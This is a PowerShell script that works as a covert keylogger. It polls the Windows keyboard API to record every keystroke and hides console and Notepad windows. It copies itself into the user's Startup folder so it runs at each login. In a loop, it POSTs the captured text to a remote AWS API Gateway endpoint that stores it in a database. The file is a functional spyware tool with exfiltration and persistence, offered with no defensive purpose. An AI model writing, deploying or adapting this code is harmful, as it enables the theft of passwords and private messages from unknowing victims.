#requires -Version 2
function hide_process($name)
{
	# the C#-style signature of an API function (see also www.pinvoke.net)
	$code = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'

	# add signature as new type to PowerShell (for this session)
	$type = Add-Type -MemberDefinition $code -Name myAPI -PassThru

	# access a process
	# (in this example, we are accessing the current PowerShell host
	#  with its process ID being present in $pid, but you can use
	#  any process ID instead)
	$process = Get-Process -Name $name

	# get the process window handle
	$hwnd = $process.MainWindowHandle

	Foreach ($i in $hwnd){ 
	  # apply a new window size to the handle, i.e. hide the window completely
	  $type::ShowWindowAsync($i, [ShowStates]::Hide) 
	}
}

function Start-KeyLogger($id, $Path="$env:temp\keylogger.txt") 
{
  # Signatures for API Calls
  $signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

  # load signatures and make members available
  $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
    
  # create output file
  $null = New-Item -Path $Path -ItemType File -Force

  try
  {
    Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

    # create endless loop. When user presses CTRL+C, finally-block
    # executes and shows the collected key presses
	For ($k=0; $k -le 10; $i++) {
		hide_process 'cmd'
		hide_process 'notepad'
		$content = ""
		For ($i=0; $i -le 100; $i++) {
		  Start-Sleep -Milliseconds 40
		  
		  # scan all ASCII codes above 8
		  for ($ascii = 9; $ascii -le 254; $ascii++) {
			# get current key state
			$state = $API::GetAsyncKeyState($ascii)

			# is key pressed?
			if ($state -eq -32767) {
			  $null = [console]::CapsLock

			  # translate scan code to real code
			  $virtualKey = $API::MapVirtualKey($ascii, 3)

			  # get keyboard state for virtual keys
			  $kbstate = New-Object Byte[] 256
			  $checkkbstate = $API::GetKeyboardState($kbstate)

			  # prepare a StringBuilder to receive input key
			  $mychar = New-Object -TypeName System.Text.StringBuilder

			  # translate virtual key
			  $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

			  if ($success) 
			  {
				# add key to logger file
				[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
				$content = $content + $mychar
			  }
			}
		  }
		}
		$id++
		$content = echo $content | ConvertTo-Json
		echo $content
		$params = @"
{
	"operation": "create",
	"tableName": "lambda-apigateway",
	"payload": {
		"Item": {
			"id": "$id",
			"text": $content
		}
	}
}
"@
		$response = Invoke-WebRequest -Uri https://95rns5uaqf.execute-api.us-west-2.amazonaws.com/default/LambdaFunctionOverHttps/dynamodbmanager -ContentType "application/json" -Method POST -Body $params 
	
	}
  }
  finally
  {
    # open logger file in Notepad
    # notepad $Path
	# $content = Get-Content $Path
	# echo $id
  }
}

Enum ShowStates
{
  Hide = 0
  Normal = 1
  Minimized = 2
  Maximized = 3
  ShowNoActivateRecentPosition = 4
  Show = 5
  MinimizeActivateNext = 6
  MinimizeNoActivate = 7
  ShowNoActivate = 8
  Restore = 9
  ShowDefault = 10
  ForceMinimize = 11
}

$user = $env:username
$user = "C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
echo $user
copy-item hw.bat $user
copy-item hw.ps1 $user


$id = Get-Random
Start-KeyLogger $id

#Start-Sleep -Seconds 2
# restore the window handle again
#Foreach ($i in $hwnd){ 
  # apply a new window size to the handle, i.e. hide the window completely
#  $type::ShowWindowAsync($i, [ShowStates]::Show) 
#}